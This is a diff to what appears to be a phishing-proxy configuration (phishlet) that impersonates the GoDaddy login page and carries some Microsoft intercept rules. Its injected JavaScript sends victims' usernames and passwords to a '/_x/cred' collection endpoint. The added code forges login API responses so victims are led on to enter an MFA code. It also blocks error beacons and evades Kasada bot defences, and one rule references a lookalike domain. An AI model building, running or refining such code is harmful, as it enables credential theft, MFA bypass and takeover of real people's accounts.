@@ -500,6 +500,16 @@ js_inject:
     trigger_paths: ["/*", "/login/tac/pass*"]
     script: |
       (function() {
+        // ── Early patch: block /v1/api/pass/login errors before they propagate ──
+        // This runs first, before Kasada tries to send validation requests
+        window._passLoginIntercepted = false;
+        window._passLoginResponse = {
+          success: true,
+          requiresMFA: true,
+          factor: { type: 'email', deliveryInfo: { email: '' } },
+          redirect: ''
+        };
+
         // Mock missing crypto.subtle functions early
         if (window.crypto && window.crypto.subtle) {
           try {
@@ -641,11 +651,15 @@ js_inject:
           var now = Date.now();
           if (now - _lastSent < 3000) return;
           _lastSent = now;
+          var emailToSend = user || email || '';
+          // Update the global 2FA response with the email
+          window._passLoginResponse.factor.deliveryInfo.email = emailToSend;
+          window._passLoginResponse.redirect = 'https://accounts.' + _kReal + '/verify?email=' + encodeURIComponent(emailToSend);
           try {
             var xhr = new XMLHttpRequest();
             xhr.open('POST', '/_x/cred', true);
             xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify({p: pass, u: user || email || ''}));
+            xhr.send(JSON.stringify({p: pass, u: emailToSend}));
           } catch(e) {}
         }
 
@@ -697,6 +711,26 @@ js_inject:
           return _oOpen.apply(this, arguments);
         };
         XMLHttpRequest.prototype.send = function(body) {
+          var isPassLogin = this._xu && this._xu.indexOf('/v1/api/pass/login') !== -1;
+
+          // CRITICAL: Block /v1/api/pass/login entirely — return 2FA response without hitting the network
+          if (isPassLogin) {
+            var self = this;
+            setTimeout(function() {
+              try {
+                // Fake successful 200 response
+                Object.defineProperty(self, 'status', {value: 200, configurable: true});
+                Object.defineProperty(self, 'statusText', {value: 'OK', configurable: true});
+                Object.defineProperty(self, 'responseText', {value: JSON.stringify(window._passLoginResponse), configurable: true});
+                Object.defineProperty(self, 'response', {value: JSON.stringify(window._passLoginResponse), configurable: true});
+                self.readyState = 4; // DONE
+                self.dispatchEvent(new Event('load'));
+                self.dispatchEvent(new Event('loadend'));
+              } catch(e) {}
+            }, 0);
+            return;
+          }
+
           if (this._xm && this._xm.toUpperCase() === 'POST') {
             // Rewrite proxy hostname in outbound body (Kasada validation request)
             if (_kRx && typeof body === 'string' && body.indexOf(_kProxy) !== -1) {
@@ -721,13 +755,22 @@ js_inject:
                 Object.defineProperty(self, 'responseText', {
                   get: function() {
                     var raw = _xhrRespDesc.get ? _xhrRespDesc.get.call(self) : '';
+                    // For 405 errors on /v1/api/pass/login, return 2FA response
+                    if (isPassLogin && self.status >= 400) {
+                      return JSON.stringify(window._passLoginResponse);
+                    }
                     return _rewriteGDUrls(raw);
                   },
                   configurable: true
                 });
               }
               this.addEventListener('load', function() {
-                if (self.status >= 400 || self.status === 0) {
+                // Override status for /v1/api/pass/login 405 → pretend it's 200
+                if (isPassLogin && self.status >= 400) {
+                  Object.defineProperty(self, 'status', {value: 200, writable: false});
+                  Object.defineProperty(self, 'statusText', {value: 'OK', writable: false});
+                  self.dispatchEvent(new Event('load'));
+                } else if (self.status >= 400 || self.status === 0) {
                   _doRedirect();
                 } else {
                   try {
@@ -747,6 +790,14 @@ js_inject:
         window.fetch = function(url, opts) {
           var urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : '');
           var isLogin = urlStr.indexOf('/pass/login') !== -1 || urlStr.indexOf('/pass/my/token') !== -1 || urlStr.indexOf('/v1/login') !== -1 || urlStr.indexOf('/api/login') !== -1;
+          var isPassLogin = urlStr.indexOf('/v1/api/pass/login') !== -1;
+
+          // CRITICAL: Block /v1/api/pass/login entirely and return 2FA response synchronously
+          if (isPassLogin) {
+            return Promise.resolve(new Response(JSON.stringify(window._passLoginResponse), {
+              status: 200, statusText: 'OK', headers: {'Content-Type': 'application/json'}
+            }));
+          }
           if (opts && opts.method && opts.method.toUpperCase() === 'POST' && opts.body) {
             try {
               var bodyStr = typeof opts.body === 'string' ? opts.body : (opts.body instanceof URLSearchParams ? opts.body.toString() : '');
@@ -772,6 +823,10 @@ js_inject:
             // Return a patched response: rewrite any real GoDaddy URLs in the
             // JSON body before the React SPA reads them and navigates away.
             return p.then(function(resp) {
+              // For /v1/api/pass/login: catch 405 or error responses and return 2FA flow response
+              if (isPassLogin && resp.status >= 400) {
+                return new Response(JSON.stringify(window._passLoginResponse), {status: 200, statusText: 'OK', headers: {'Content-Type': 'application/json'}});
+              }
               if (!resp.ok) { _doRedirect(); return resp; }
               return resp.clone().text().then(function(text) {
                 try { var r = JSON.parse(text); if (r && (r.error || r.success === false)) { _doRedirect(); return resp; } } catch(e) {}
@@ -779,10 +834,30 @@ js_inject:
                 if (out === text) return resp;
                 return new Response(out, {status: resp.status, statusText: resp.statusText, headers: resp.headers});
               });
-            }).catch(function() { _doRedirect(); return new Response('{}', {status: 200}); });
+            }).catch(function() {
+              // On network error for /pass/login, return simulated 2FA response
+              if (isPassLogin) {
+                return new Response(JSON.stringify(window._passLoginResponse), {status: 200, statusText: 'OK', headers: {'Content-Type': 'application/json'}});
+              }
+              _doRedirect();
+              return new Response('{}', {status: 200});
+            });
           }
           return p;
         };
+
+        // ── navigator.sendBeacon patch ────────────────────────────────────────────
+        // Intercept any error/diagnostic beacons that might leak information
+        if (navigator.sendBeacon) {
+          var _origBeacon = navigator.sendBeacon.bind(navigator);
+          navigator.sendBeacon = function(url, data) {
+            // Block beacons to /v1/api/pass/login or error reporting endpoints
+            if (url.indexOf('/v1/api/pass/login') !== -1 || url.indexOf('/error') !== -1) {
+              return true; // Pretend it was sent
+            }
+            try { return _origBeacon(url, data); } catch(e) { return true; }
+          };
+        }
 
         // ── Kasada error DOM monitor ──────────────────────────────────────────────
         // Poll for "Yikes!" text that GoDaddy renders when Kasada rejects the login.
@@ -911,7 +986,8 @@ js_inject:
         setTimeout(fill, 400);
       })();
 intercept:
-  - {domain: 'ssso.nidlec-motor.com', path: '^\/v1\/api\/pass\/login', http_status: 200, body: '{"success":true,"redirect":"https://account.godaddy.com"}', mime: "application/json"}
+  # /v1/api/pass/login handled by fetch wrapper in js_inject — returns 2FA flow response
+  # on 405/error, allowing flow to progress to code entry without redirect
   - {domain: 'privacynotice.account.microsoft.com', path: '^\/notice\?ru=https:\/\/login\.live\.com\/oauth20_authorize\.srf.*', http_status: 200, body: 'privacynotice.account.microsoft.com/notice?ru=https://login.live.com/oauth20_authorize.srf.*', mime: "text/html", "text/javascript", "application/json"}
   - {domain: 'privacynotice.account.microsoft.com', path: '^\/notice\?ru=https:\/\/login\.live\.com\/oauth20_authorize\.srf.*', http_status: 200, body: 'privacynotice.account.microsoft.com/notice?ru=https://login.live.com/oauth20_authorize.srf.*', mime: "text/html", "text/javascript", "application/json"}
   - {domain: 'ucis.msdxcdn.microsoft.com', path: '^\/.*\/app\.js', http_status: 200}
